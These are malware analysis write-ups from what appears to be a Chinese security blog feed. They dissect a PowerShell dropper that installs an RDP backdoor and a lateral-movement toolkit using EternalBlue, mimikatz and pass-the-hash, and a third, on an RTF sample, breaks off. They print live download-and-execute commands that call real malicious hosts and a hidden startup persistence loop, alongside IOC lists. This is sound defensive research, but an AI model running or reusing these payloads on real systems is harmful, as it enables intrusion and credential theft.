class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 &amp;&amp; start &quot;&quot; /min &quot;%~dpnx0&quot; %* &amp;&amp; exit</span><br><span class="line">powershell -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AOQA0AC4AMQA1ADgALgAyADQANQAuADgAOAAvAG0AYQBlAC4AcABzADEAJwApAA==</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>base64 解码后为以下内容，执行下载mae。ps1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX (New-Object Net.Webclient).downloadstring(&#x27;http://94.158.245.88/mae.ps1&#x27;)</span><br></pre></td></tr></table></figure><h4 id="3-2-mae-ps1"><a href="#3-2-mae-ps1" class="headerlink" title="3.2 mae.ps1"></a>3.2 mae.ps1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(New-Object Net.Webclient).downloadstring(&quot;http://94.158.245.88/mae/start.vbs&quot;) | out-file $env:temp\start.vbs</span><br><span class="line">(New-Object Net.Webclient).downloadstring(&quot;http://94.158.245.88/mae/Get-Content.ps1&quot;) | out-file $env:temp\Get-Content.ps1</span><br><span class="line">(New-Object Net.Webclient).downloadstring(&quot;http://94.158.245.88/mae/ready.ps1&quot;) | out-file $env:temp\ready.ps1</span><br><span class="line"></span><br><span class="line">start-process wscript -args &quot;$env:temp\start.vbs&quot;</span><br></pre></td></tr></table></figure><p>下载2个powerrshell脚本和1个vbs脚本。运行vbs脚本。最终三个脚本都是为了执行Get-Content.ps1</p><h4 id="3-3-start-vbs"><a href="#3-3-start-vbs" class="headerlink" title="3.3  start.vbs"></a>3.3  start.vbs</h4><p>通过WMI查看SMBiosData，反VM技术。如果成功，执行ready.ps1文件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-6.png" alt="6"></p><h4 id="3-4-ready-ps1"><a href="#3-4-ready-ps1" class="headerlink" title="3.4 ready.ps1"></a>3.4 ready.ps1</h4><p>大体就是使用bypass amsi 去执行Get-Conten。ps1</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-7.png" alt="7"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set-alias invokecommand expandstring invoke-expression AmsiScanBufferamsi.dll@¸W</span><br></pre></td></tr></table></figure><p>综上所述这四个文件都是为了Get-Conten。ps1这一个脚本而去服务的</p><p>下面我们来重点分析这个脚本。</p><h4 id="3-5-Get-Conten-ps1"><a href="#3-5-Get-Conten-ps1" class="headerlink" title="3.5 Get-Conten.ps1"></a>3.5 Get-Conten.ps1</h4><p>前面部分和ready。ps1相似，也是用来<strong>bypass  asmi</strong>的</p><p>但是<strong>func svcngnxjld 函数</strong> 是不同的，目的就是为了将其变量 <strong>$sotcschdvz</strong>的<strong>base64 payload</strong> 在变量 <strong>$swzsujyskx</strong>   <strong>三层字符串解密输出</strong>，  并 调用invoke-expression 进行执行</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-8.png" alt="8"></p><p>我们去掉最后一行 invoke-expression 字符串，让其输出**$swzsujyskx **  变量解密后的内容，还原被加密之前的内容</p><p>内容大体如下图所示</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-9.png" alt="9"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-10.png" alt="10"></p><p>那么当我们去解码**$reg base64**时，发现该代码为乱码。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-11.png" alt="11"></p><p>那么我们发现**$reg命名为 $giruhabg** ，然后被<strong>func gogeoha31函数调用</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-12.png" alt="12"></p><p>那么我们可以看到<strong>func gogeoha31函数</strong> ，$low变量引起我们的注意，这个变是解密的关键。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-13.png" alt="13"></p><p>我们继续追踪到<strong>func pasgouta函数调用</strong> ,可以看到 其功能为xor解密，而key 为  <strong>“urueusj”</strong> </p><p>我们可以找到网上开源的powershell 脚本进行 xor加密与解密 </p><p><a href="https://gist.github.com/gabemarshall/f25afd533b341e1b21bc39f8e26946b7">https://gist.github.com/gabemarshall/f25afd533b341e1b21bc39f8e26946b7</a></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-14.png" alt="14"></p><p>那么我们可以在CyberChef中加入xor的模块放入key，以及它还进行了 base64加密和gzip的压缩,然后再次使用base64加密，那么我们依次加入的模块为如下图所示，只需替换base64即可。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-15.png" alt="15"></p><p>那么我们依次对下图所示的几个变量进行解码，即可得到相对应的文件。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-16.png" alt="16"></p><p>将这些base64解密等处理后的文件为如下所示</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-17.png" alt="17"></p><p><strong>1.rdpclip.exe</strong> </p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-18.png" alt="18"></p><p><strong>2.rdpwap.ini</strong> 目的就是开启rdp进行远控</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-19.png" alt="19"></p><p><strong>3.rfxvmt.dll</strong> </p><p>rdpclip.exe对于RDP会话中的文件复制和粘贴是必需的，而rfxvmt.dll对于Microsoft RemoteFX VM Transport是必需的，它为RDP添加了附加功能，例如访问物理图形处理单元（GPU）硬件加速</p><p>在计算机上搜索这两个文件，如果找不到，则恶意软件会将它们写入系统。此外，该恶意软件还会进行以下权限更改：</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-20.png" alt="20"></p><p>这些权限更改对于两个删除的DLL文件正常运行是必需的。</p><p>这以上三个文件<strong>与已知19年的APT组织TA505—–Hive0065</strong>   使用的方法相似</p><p><strong>4.reg</strong>注册表</p><p><strong>依旧可以看到 reg注册表、rdp.ini配置文件、DLL文件 均与这个 开源的rdpwrap项目相关</strong> </p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-21.png" alt="21"></p><p><strong>5.mediasvc.png与mediasrv.png</strong></p><p>这两个则为后门通信程序</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-22.png" alt="22"></p><h4 id="4-部署"><a href="#4-部署" class="headerlink" title="4.部署"></a>4.部署</h4><p>而get-conten文件最后呢 对系统进行了一些配置修改</p><p><strong>1.修改远程端口7201,加载后门服务，开启远程，添加服务器</strong></p><p><strong>2.获得域管理员权限.</strong></p><p><strong>3.修改时间戳</strong></p><p><strong>4.添加rdp和终端服务</strong></p><p><strong>5.清理痕迹</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-23.png" alt="23"></p><h3 id="4-IOC"><a href="#4-IOC" class="headerlink" title="4.IOC"></a>4.IOC</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"> Main object - 12.bat </span><br><span class="line">    SHA256 77895769097f983c4137bbea5b87a685f2252994e3761ede65081e45d496177c </span><br><span class="line">    SHA1 8b9daf70dfbd04ecf3f98ef874392231d2ce1c70</span><br><span class="line">    MD5 ca9cc08a6f67e22bff228f7b862ba30e </span><br><span class="line"></span><br><span class="line">    mae.ps1 </span><br><span class="line">    SHA256 42C277ADA9C6F8DDCD6211E4792A8DF1FA0D0AD8CBB867EEE1A431CC1B79834D </span><br><span class="line">    SHA1 348909394CA5D1E605ECB20CFA95A1870F529669 </span><br><span class="line">    MD5 DBD0A5FB31FDF76CF0D7DFA2E67ADEB7 </span><br><span class="line"></span><br><span class="line">    start.vbs</span><br><span class="line">    SHA256 5D4A0661CFB3CCA59ACD8A9FA433EC2C48D686DA36F3890B73E7B9F37C60E980 </span><br><span class="line">    SHA1 57CED4325A4F1C93D6928E560E5C7209A4ED0282 </span><br><span class="line">    MD5 9E3905E054E78547EC4FBBBB73E92B78</span><br><span class="line"></span><br><span class="line">    ready.ps1</span><br><span class="line">    SHA256 586850ea99ba4844c0dde20b7260c4222c67e0ede021c5e1c1339e664b1ce191 </span><br><span class="line">    SHA1 17c7dd1b1e72c3fcdef91e9206f58406a98564e7 </span><br><span class="line">    MD5 18e76ebd0f8694e0f998443e5763ea8d</span><br><span class="line"></span><br><span class="line">    Get-Content.ps1</span><br><span class="line">    SHA256 E9E217E32B0F5963FD40CAFB1CE800907B7B06F8A0E960B62BFA41D37841DEAB </span><br><span class="line">    SHA1 B8C54D44DE03CFF2467FB504CD972D677C32AB25 </span><br><span class="line">    MD5 DED160C4F2409D48DA8FEAF0934D3F02</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Get-Content.ps1(malware-and-artifacts)</span><br><span class="line"></span><br><span class="line">MD5 (Rdpclip.exe) = 1690e3004f712c75a2c9ff6bcde49461</span><br><span class="line">MD5 (dgiusjeja64_mediasrv.png) = c13860727871a39063e0bb58117919ba</span><br><span class="line">MD5 (otiiahj64_mediasvc.png) = aa6bf98c9120b0539c0270a3e453ddf6</span><br><span class="line">MD5 (reg.reg) = 5a2f4e19ffc05366279f9341913722f1</span><br><span class="line">MD5 (rfxvmt.dll) = dc39d23e4c0e681fad7a3e1342a2843c</span><br><span class="line">MD5 (wupsvc.jpg_rdpwap.ini) = dc5b36b03764114c55cec484d975888a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Connections  </span><br><span class="line"> IP 94.158.245.88 </span><br><span class="line"> IP 5.181.156.3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/HTTPS requests  </span><br><span class="line"> URL http://94.158.245.88/mae/start.vbs </span><br><span class="line"> URL http://94.158.245.88/mae/Get-Content.ps1 </span><br><span class="line"> URL http://94.158.245.88/mae/ready.ps1</span><br></pre></td></tr></table></figure><h3 id="链接："><a href="#链接：" class="headerlink" title="链接："></a>链接：</h3><p><a href="https://github.com/stascorp/rdpwrap">https://github.com/stascorp/rdpwrap</a></p><p><a href="https://suid.ch/research/Telegram_Malware_Analysis.html">https://suid.ch/research/Telegram_Malware_Analysis.html</a></p><p><a href="https://www.joesandbox.com/analysis/370722/0/html">https://www.joesandbox.com/analysis/370722/0/html</a></p><p><a href="https://www.joesandbox.com/analysis/370720/0/html">https://www.joesandbox.com/analysis/370720/0/html</a></p><p><a href="https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/operation-ta505-part2/">https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/operation-ta505-part2/</a></p><p><a href="https://gist.github.com/gabemarshall/f25afd533b341e1b21bc39f8e26946b7">https://gist.github.com/gabemarshall/f25afd533b341e1b21bc39f8e26946b7</a></p><p><a href="https://www.binarydefense.com/an-updated-servhelper-tunnel-variant/">https://www.binarydefense.com/an-updated-servhelper-tunnel-variant/</a></p><p><a href="https://attack.mitre.org/groups/G0092/">https://attack.mitre.org/groups/G0092/</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-24.jpg&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="windows" scheme="https://www.ggsec.cn/categories/windows/"/>
    
    <category term="恶意样本分析" scheme="https://www.ggsec.cn/categories/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Windows" scheme="https://www.ggsec.cn/tags/Windows/"/>
    
    <category term="恶意样本分析" scheme="https://www.ggsec.cn/tags/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>powershell横向渗透样本分析</title>
    <link href="https://www.ggsec.cn/powershell%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90.html"/>
    <id>https://www.ggsec.cn/powershell%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90.html</id>
    <published>2021-03-09T10:34:14.000Z</published>
    <updated>2022-11-25T12:54:40.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20210309_193244.jpg" alt="enter description here"></p><span id="more"></span><h3 id="1-起源"><a href="#1-起源" class="headerlink" title="1.起源"></a>1.起源</h3><p>前段时间收到一份样本 类似于<strong>DLTMiner</strong>活动攻击留下的样本，这份样本与2019年<strong>DLTMiner</strong>及其相似,同时也与近期的<strong>exchange</strong>服务器相关</p><p>同时 Kyle Hanslovan在推文发布一张图，图中有powershell执行代码调用执行url地址的字符串</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-1.jpg" alt="1"></p><p>http[:]&#x2F;&#x2F;p。estonine。com&#x2F;p?e</p><p>调用执行的依旧为powershell的代码</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-2.png" alt="2"></p><h3 id="2-powershell混淆"><a href="#2-powershell混淆" class="headerlink" title="2.powershell混淆"></a>2.powershell混淆</h3><p> 解码powershell的混淆,去掉 IEX 或  Invoke-Expression  </p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-3.png" alt="3"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-4.png" alt="4"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-5.png" alt="5"></p><h4 id="解码后"><a href="#解码后" class="headerlink" title="解码后"></a>解码后</h4><p>解出多次混淆后，下图为最后完整的代码</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-6.png" alt="6"></p><p>这里重点内容为 下载执行update。png的内容</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-7.png" alt="7"></p><h4 id="updata-png"><a href="#updata-png" class="headerlink" title="updata-png"></a>updata-png</h4><p>而update。png内容如下</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-8.png" alt="8"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-9.png" alt="9"></p><p>解码混淆两三次后如下图所示</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-10.png" alt="10"></p><p>下面重点开始讲这部分的脚本的功能。</p><h3 id="3-update-png的功能"><a href="#3-update-png的功能" class="headerlink" title="3.update-png的功能"></a>3.update-png的功能</h3><h4 id="3-1-永恒之蓝"><a href="#3-1-永恒之蓝" class="headerlink" title="3.1.永恒之蓝"></a>3.1.永恒之蓝</h4><p>加入了开源脚本的powershell exp</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-10.png" alt="10"></p><h4 id="3-2永恒之蓝扫描"><a href="#3-2永恒之蓝扫描" class="headerlink" title="3.2永恒之蓝扫描"></a>3.2永恒之蓝扫描</h4><p>加入了开源脚本ms17-010scanner.cs</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-11.png" alt="11"></p><h4 id="3-3-目标选择"><a href="#3-3-目标选择" class="headerlink" title="3.3 目标选择"></a>3.3 目标选择</h4><p>随机生成用于定位的IP地址，并在特定端口号上进行端口扫描以侦听服务，例如445 &#x2F; TCP（SMB），1433 &#x2F; TCP（MS-SQL服务器）或65529 &#x2F; TCP（先前已被该威胁参与者破坏的计算机）。</p><p>脚本从远程计算机获得响应后，它将探测EternalBlue SMB漏洞的IP地址，或对MS-SQL服务执行暴力攻击，以试图破坏计算机。带有此侦听端口的计算机在65529 &#x2F; TCP上打开，之前，该计算机或其他威胁因素已使用类似的脚本破坏了该计算机</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-12.png" alt="12"></p><h4 id="3-4powerDump"><a href="#3-4powerDump" class="headerlink" title="3.4powerDump"></a>3.4powerDump</h4><p>使用powershell dump  从注册表中读取哈希值来执行哈希转储</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-13.png" alt="13"></p><h4 id="3-5mimikatz"><a href="#3-5mimikatz" class="headerlink" title="3.5mimikatz"></a>3.5mimikatz</h4><p>加入了开源脚本 将单文件载入mimikaze.DLL到powershell的内存中运行，分别为32位和64位的dll</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-14.png" alt="14"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-15.png" alt="15"></p><p>32bit - D58A41A393F4B9A406226689F29C7017CA20F788 </p><p>64bit - FA8E53CB3497CBF81CFEE0DDBF171DE98B83211D</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-16.png" alt="16"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-17.png" alt="17"></p><p>获取信息</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-24.png" alt="24"></p><h4 id="3-6TheHash"><a href="#3-6TheHash" class="headerlink" title="3.6TheHash"></a>3.6TheHash</h4><p>加入了开源脚本Invoke-TheHash包含用于执行传递哈希WMI和SMB任务的PowerShell函数</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-18.png" alt="18"></p><p>执行psexec</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-23.png" alt="23"></p><h4 id="3-7-RDP爆破"><a href="#3-7-RDP爆破" class="headerlink" title="3.7 RDP爆破"></a>3.7 RDP爆破</h4><p>脚本内嵌用户名字典和hash表和明文密码表<br>用户列表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">administrator</span><br><span class="line">admin</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-19.png" alt="19"></p><h4 id="3-8-权限维持"><a href="#3-8-权限维持" class="headerlink" title="3.8 权限维持"></a>3.8 权限维持</h4><p>创建计划任务和防火墙 添加转发策略</p><p>上传文件到:                       </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\&lt;Name&gt;\AppData\Roaming\sign.txt 内容0:                        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\&lt;Name&gt;\AppData\Roaming\flashplayer.tmp 内容:try&#123;(new ActiveXObject(&quot;WScript.Shell&quot;)).Run(&quot;powershell -w hidden -ep bypass -c while($True)&#123;try&#123;IEX (New-Object Net.WebClient).downloadstring(&#x27;http://p.estonine.com/low?ipc&#x27;)&#125;catch&#123;Sleep -m 2500000&#125;&#125;&quot;,0,false);&#125;catch(e)&#123;&#125;                        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\&lt;Name&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\FlashPlayer.lnk 快捷方式指向的目标:C:\Windows\system32\wscript.exe //e:javascript &quot;%appdata%\flashplayer.tmp&quot;</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-21.png" alt="21"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-22.png" alt="22"></p><h3 id="4-执行过程"><a href="#4-执行过程" class="headerlink" title="4.执行过程"></a>4.执行过程</h3><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-25.png" alt="25"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">while(true)循环执行:</span><br><span class="line">    1.线程休眠200秒</span><br><span class="line">    2.创建名为Global\PSexec的互斥锁</span><br><span class="line">    3.获取第一张网卡的MAC地址</span><br><span class="line">    4.获取杀毒软件</span><br><span class="line">    5.如果存在杀毒 (条件判断)</span><br><span class="line">        True:$av变量为将杀毒名称以:&lt;name&gt;|&lt;name&gt;的格式拼接在一起，例如:Windows Defender|360安全卫士|</span><br><span class="line">        False:$av变量为空</span><br><span class="line"></span><br><span class="line">    6.拼接url格式:http://p.estonine.com/getnew.php?ver=2020&amp;mac=&lt;网卡mac地址&gt;&amp;re=&amp;pid=&lt;当前进程pid&gt;&amp;av=&lt;杀毒名称&gt;&amp;ver=&lt;系统版本&gt;&amp;bit=&lt;系统位数&gt;</span><br><span class="line">    7.从url请求对应的内容读取内容后将##替换为空base64解码执行下载的内容</span><br><span class="line">    8.调用localscan函数检查本地和内网445端口判断是否开启</span><br><span class="line">    9.调用localscan函数检查本地和内网65353端口判断是否开启</span><br><span class="line">    10.$Bserver数组不存在该IP调用copyrun函数</span><br><span class="line">        调用Invoke-SMBC函数hash传递攻击</span><br><span class="line">        传递成功:调用Invoke-SE函数hash传递攻击执行开启防火墙和设置计划任务，和上传文件到指定路径(如果源路径存在该文件则删除)</span><br><span class="line">        </span><br><span class="line">      创建计划任务和防火墙 添加转发策略</span><br><span class="line">      文件上传</span><br><span class="line"></span><br><span class="line">        传递失败:</span><br><span class="line">    11.MS17010扫描攻击</span><br><span class="line">    12.休眠100秒</span><br></pre></td></tr></table></figure><h3 id="5-IOC"><a href="#5-IOC" class="headerlink" title="5.IOC"></a>5.IOC</h3><p>此脚本结合了多种开源的powershell脚本形成了此内网横向渗透的工具集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Main object - &quot;update.png&quot;   </span><br><span class="line"></span><br><span class="line"> URL http://188.166.162.201/update.png</span><br><span class="line"> MD5 4dd2c9bfd0fc3ee162980af37ce1d2ec</span><br><span class="line"> </span><br><span class="line">DNS requests  </span><br><span class="line"></span><br><span class="line"> DOMAIN p.estonine.com </span><br><span class="line"> DOMAIN api.ipify.org </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Connections  </span><br><span class="line"></span><br><span class="line"> IP 188.166.162.7 </span><br><span class="line"> IP 188.166.162.201 </span><br><span class="line"> IP 188.166.162.2 </span><br><span class="line"> IP 188.166.162.3</span><br><span class="line"> ..........</span><br></pre></td></tr></table></figure><p>链接：</p><p><a href="https://app.any.run/tasks/91d52b22-d87f-4a7e-bd3a-22c48525df6d/">https://app.any.run/tasks/91d52b22-d87f-4a7e-bd3a-22c48525df6d/</a></p><p><a href="https://422926799.github.io/posts/855d1ef5.html">https://422926799.github.io/posts/855d1ef5.html</a></p><p><a href="https://github.com/tevora-threat/eternal_blue_powershell/blob/master/EternalBlue.ps1">https://github.com/tevora-threat/eternal_blue_powershell/blob/master/EternalBlue.ps1</a></p><p><a href="https://github.com/vletoux/pingcastle/blob/master/Scanners/ms17_010scanner.cs">https://github.com/vletoux/pingcastle/blob/master/Scanners/ms17_010scanner.cs</a></p><p><a href="https://news.sophos.com/en-us/2019/10/01/lemon_duck-powershell-malware-cryptojacks-enterprise-networks/">https://news.sophos.com/en-us/2019/10/01/lemon_duck-powershell-malware-cryptojacks-enterprise-networks/</a></p><p><a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-PowerDump.ps1">https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-PowerDump.ps1</a></p><p><a href="https://gist.githubusercontent.com/DShankle/825a976504df012d7ce465f10eaaa728/raw/603c3de11c264c0aa94e03980b8ac12bc6cda29c/gistfile1.txt">https://gist.githubusercontent.com/DShankle/825a976504df012d7ce465f10eaaa728/raw/603c3de11c264c0aa94e03980b8ac12bc6cda29c/gistfile1.txt</a></p><p><a href="https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-SMBClient.ps1">https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-SMBClient.ps1</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20210309_193244.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="windows" scheme="https://www.ggsec.cn/categories/windows/"/>
    
    <category term="恶意样本分析" scheme="https://www.ggsec.cn/categories/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Windows" scheme="https://www.ggsec.cn/tags/Windows/"/>
    
    <category term="恶意样本分析" scheme="https://www.ggsec.cn/tags/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>rtf恶意样本静态分析</title>
    <link href="https://www.ggsec.cn/rtf%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90.html"/>
    <id>https://www.ggsec.cn/rtf%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90.html</id>
    <published>2021-02-01T10:34:14.000Z</published>
    <updated>2022-11-25T12:55:25.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/WechatIMG9.jpeg" alt="enter description here"></p><span id="more"></span><h2 id="1-起源"><a href="#1-起源" class="headerlink" title="1.起源"></a>1.起源</h2><p>前几天一位推友发布推文一个恶意样本弹框 大概意思是不能在any run 沙箱中运行</p><p>   <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-2.png" alt="2"></p><p>结果推友当时就在any run 沙箱上传运行。也是比较有意思的样本</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-1.png" alt="1"></p><h2 id="2-样本分析"><a href="#2-样本分析" class="headerlink" title="2.样本分析"></a>2.样本分析</h2><p>既然这么搞笑，就我们一起来分析这个恶意样本吧</p><p>本文从静态的角度分析样本。</p><p>首先我们考虑使用010编辑器查看，结果发现为rtf的文件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-18.png" alt="20201-01-29-18"></p><p>那么我们这里使用oletools 套件中个的rtfobj查看，结果发现它中包含vbs文件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-5.png" alt="20201-01-29-5"></p><p>那么我们对其进行dump下来vbs文件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-3.png" alt="3"></p><h2 id="3-VBS混淆"><a href="#3-VBS混淆" class="headerlink" title="3.VBS混淆"></a>3.VBS混淆</h2><p>下面我们来分析vbs的内容，由于代码过于冗长，不便截图，我这里就挑重点讲。</p><p>下图我们可以看到vbs代码中一个红框包含了字符串的内容为powershell，第二个红框也是为powershell的代码，其中vbs对其进行拼接、替换字符串、以及字符串倒序。 </p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-4.png" alt="4"></p><p>那么我们重新整理vbs的代码对其进行输出到控制台</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-6.png" alt="20201-01-29-6"></p><p>这里我们调用cscript 